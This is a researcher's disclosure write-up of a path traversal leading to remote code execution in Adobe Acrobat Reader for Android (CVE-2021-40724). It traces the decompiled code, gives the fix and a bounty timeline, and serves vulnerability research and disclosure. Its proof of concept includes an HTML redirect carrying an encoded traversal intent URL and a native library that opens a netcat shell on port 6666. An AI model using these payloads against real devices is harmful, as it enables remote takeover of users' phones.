---
title: "RCE in Adobe Acrobat Reader for android(CVE-2021-40724)"
date: 2022-01-14T11:16:51+05:30
Description: ""
Tags: []
Categories: []
DisableComments: false
---

## # Summary
While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path transversal vulnerability.
Abode reader was also using Google play core library for dynamic code loading. using path transversal bug and dynamic code loading, i was able to acheive remote code execution.

## # Finding Path transversal vulnerability

```
        <activity android:theme="@style/Theme_Virgo_SplashScreen" android:name="com.adobe.reader.AdobeReader" android:exported="true" android:launchMode="singleTask" android:screenOrientation="user" android:configChanges="keyboardHidden|screenLayout|screenSize|smallestScreenSize" android:noHistory="false" android:resizeableActivity="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.intent.action.EDIT"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="file"/>
                <data android:scheme="content"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:mimeType="application/pdf"/>
            </intent-filter>
```
There is this intent-filter in the app which shows it will accept http/https url scheme and mimeType should be `application/pdf` for this actiivity.

When an intent with data url for example `http://localhost/test.pdf`  is sent to adobe reader app,it downloads the file in `/sdcard/Downloads/Adobe Acrobat` folder with filename as LastPathSegment(i.e `test.pdf`) of the sent url. 

Activity `com.adobe.reader.AdobeReader` receives the intent and starts `ARFileURLDownloadActivity` activity.
```
public void handleIntent() {
            Intent intent2 = new Intent(this, ARFileURLDownloadActivity.class);
            intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData());
            intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType());
            startActivity(intent2);
    }
```
This activity `ARFileURLDownloadActivity`starts `com.adobe.reader.misc.ARFileURLDownloadService` service.
```
public void onMAMCreate(Bundle bundle) {
        super.onMAMCreate(bundle);
        this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class);
        Bundle bundle2 = new Bundle();
        //...//
        this.mServiceIntent.putExtras(bundle2);
        startService();
    }
```
In `com.adobe.reader.misc.ARFileURLDownloadService.java`
```
public int onMAMStartCommand(Intent intent, int i, int i2) { 
        Bundle extras = intent.getExtras();
        //..//
        String string = extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, null);
        ARURLFileDownloadAsyncTask aRURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), true, string);
        this.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask;
        aRURLFileDownloadAsyncTask.taskExecute(new Void[0]);
        return 2;
    }
```
In `com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java`
```
    private void downloadFile() throws IOException, SVFileDownloadException {
        Exception exc;
        boolean z;
        Throwable th;
        boolean z2;
        Uri fileURI = this.mDownloadModel.getFileURI();
        URL url = new URL(fileURI.toString());
        try {
            String downloadFile = new ARFileFromURLDownloader(new ARFileFromURLDownloader.DownloadUrlListener() {
               ARFileFromURLDownloader.DownloadUrlListener
                public void onProgressUpdate(int i, int i2) {
                    ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, i, i2);
                }

                @Override // com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener
                public boolean shouldCancelDownload() {
                    return ARURLFileDownloadAsyncTask.this.isCancelled();
                }
            }).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), this.mDownloadModel.getMimeType(), null, fileURI), url);
            //...//
```
This method `BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData` takes this.mUri.getLastPathSegment() as argument and which returns the decoded  last segment in the path of the url.

For example let take this url `https://localhost/x/..%2F..%2Ffile.pdf` so when this url is passed to getLastPathSegment() method it will take `..%2F..%2Ffile.pdf` as last segment of the url and will return `../../file.pdf` as output.

There was not any sanitization performed in `downloadFile` variable before passing it into  File instance which resulted into path transversal vulnerability.

## # Getting RCE
Adobe Acrobat Reader app was using Google play core library to provide additional feature on the go to its users. 

A simple way to know whether an app is using play core library for dynamic code loading is to check for `spiltcompat` directory in `/data/data/:application_id/files/` directory.

Using path transversal bug i can write an arbitrary apk in `/data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/` directory of the app.The classes from the attacker’s apk would automatically be added to the ClassLoader of the app and malicious code will be executed when called from the app. For more detailed explanation read this [article](https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/)

Adobe reader app also downloads an module name `FASOpenCVDF.apk` during runtime of app. The plan was to overwrite this file and acheive code execution remotely, but this was not possible. The issue was with this path transversal vulnerability i  could not write over existing files... only create new files. 

I was stuck at this stage for a long time finding a way to gain code execution remotely without installing an additional apk. After analysing other apps using play core library installed on my device, i saw play core library also provide feature of loading native code(.so files) from  `/data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/` directory.

`FASOpenCVDF.apk` module was also loading an native library from
`/data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a` directory. I decided to take a look into `FASOpenCVDF.apk` source code and there i founded this module is also trying to load three unavailable libraries `libADCComponent.so`,`libColoradoMobile.so` and `libopencv_info.so ` and this solved my issue of executing code remotely.

I created a simple poc native library , renamed it to `libopencv_info.so` and dropped it in /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory, and from next launch whenever fill and sign feature would be used, the malicious code will be executed.

## # Proof of Concept

```
<html>
<title> RCE in Adobe Acrobat Reader for android </title>
<body>
    <script>
        window.location.href="intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end";
    </script>    
</body>
</html>
```


```
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {

    if (fork() == 0) {
        system("toybox nc -p 6666 -L /system/bin/sh -l");
    }
    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }
    return JNI_VERSION_1_6;
}
```



###  # Vulnerability Fix !
In `com.adobe.libs.buildingblocks.utils.BBIntentUtils.java`
```
private static final String FILE_NAME_RESERVED_CHARACTER = "[*/\\|?<>\"]";
public static String getModifiedFileNameWithExtensionUsingIntentData(String str, String str2, ContentResolver contentResolver, Uri uri) {
        if (TextUtils.isEmpty(str)) {
            str = BBConstants.DOWNLOAD_FILE_NAME;
        }
        String str3 = null;
        if (!(contentResolver == null || uri == null)) {
            str3 = MAMContentResolverManagement.getType(contentResolver, uri);
        }
        String str4 = !TextUtils.isEmpty(str3) ? str3 : str2;
        if (!TextUtils.isEmpty(str4)) {
            String fileExtensionFromMimeType = BBFileUtils.getFileExtensionFromMimeType(str4);
            if (!TextUtils.isEmpty(fileExtensionFromMimeType)) {
                if (str.lastIndexOf(46) == -1) {
                    str = str + '.' + fileExtensionFromMimeType;
                } else {
                    String mimeTypeForFile = BBFileUtils.getMimeTypeForFile(str);
                    if (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) && !TextUtils.equals(mimeTypeForFile, str2))) {
                        str = str + '.' + fileExtensionFromMimeType;
                    }
                }
            }
        }
        return str.replaceAll(FILE_NAME_RESERVED_CHARACTER, "_");
    }
```




Have a nice day! and if you got any doubt you can contact me on Twitter.

#### Timeline
- Jul 29th,2021 - Reported the vulnerability
- Aug 4th ,2021 - report traiged
- Oct 13th,2021 - Vulnerability Fixed
- Dec 4th ,2021 - $10000 bounty awarded from GPSRP





